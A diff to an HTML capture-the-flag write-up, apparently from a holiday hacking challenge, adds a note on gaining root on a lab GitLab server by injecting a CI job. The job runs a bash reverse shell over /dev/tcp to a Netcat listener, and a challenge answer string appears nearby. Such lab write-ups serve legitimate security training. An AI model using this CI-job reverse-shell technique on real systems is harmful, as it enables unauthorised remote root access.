@@ -1391,6 +1391,12 @@ git<span class="w"> </span>push
 <p class="admonition-title">Answer</p>
 <p>oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT</p>
 </div>
+<div class="admonition note">
+<p class="admonition-title">Getting root on <em>gitlab.flag.net.internal</em></p>
+<p>The same <code>.gitlab-ci.yml</code> technique outlined above can also be used to access <em>gitlab.flag.net.internal</em>. The only caveat is that the Gitlab host isn't running an SSH server to connect to, so we'll need to use a reverse shell instead. Start by splitting the terminal window in two by running <code>tmux</code> and pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-b">B</kbd></span>, followed by <span class="keys"><kbd class="key-double-quote">"</kbd></span>. This gives us two command shells that we can switch between by pressing <span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-b">B</kbd></span>, followed by <span class="keys"><kbd class="key-arrow-up">Up</kbd></span> or <span class="keys"><kbd class="key-arrow-down">Down</kbd></span>.</p>
+<p>In the first shell, start a Netcat listener using <code>nc -lvp 8080</code> to receive the incoming reverse shell connection. In the other shell, add a new job to <code>.gitlab-ci.yml</code> that initiates the reverse shell using <code>/bin/bash -i &gt;&amp; /dev/tcp/172.18.0.99/8080 0&gt;&amp;1</code>. Commit and push your changes to the Gitlab host and wait for the automation to run. After a few seconds the connection will be established and we'll have <em>root</em> acces on the Gitlab server. <img alt="😎" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f60e.svg" title=":sunglasses:" /></p>
+<p><img alt="Root on Gitlab" class="border" src="../../img/objectives/o7/root_on_gitlab.png" /></p>
+</div>
 <h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
 <div class="admonition quote">
 <p class="admonition-title">Rippin Proudboot</p>
